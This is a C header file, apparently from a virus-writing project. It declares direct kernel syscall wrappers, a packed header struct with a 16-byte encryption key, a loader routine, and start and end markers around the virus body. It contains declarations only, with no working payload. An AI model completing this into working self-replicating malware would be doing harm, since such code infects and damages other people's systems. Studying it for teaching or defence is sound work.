#ifndef FT_VIRUS_H
# define FT_VIRUS_H

#include <stdint.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/mman.h>

/* -- Syscall -- */
#define __NR_gettimeofday	0x4E
#define __NR_mmap2		192




typedef struct	s_header
{
		uint32_t	size;
		void		*address;
		unsigned char	key[16];
			
}		__attribute__((packed))t_header;

void	Blaster_start( void );
void	Main_Blaster( void );

/* -- Wrapper for kernel syscall -- */
long 	Syscall0( int num_syscall );
long 	Syscall1( int num_syscall, long );
long 	Syscall2( int num_syscall, long, long );
long	Syscall3( int num_syscall, long, long, long );
long	Syscall4( int num_syscall, long, long, long, long );
long	Syscall5( int num_syscall, long, long, long, long, long );
long	Syscall6( int num_syscall, long, long, long, long, long, long);

/* -- Loader -- */
/* -- For Encrypt -- */
void 	loader( void );
t_header	*_GET_HEADER_VIRUSE( void );

void	Blaster_end( void );
#endif
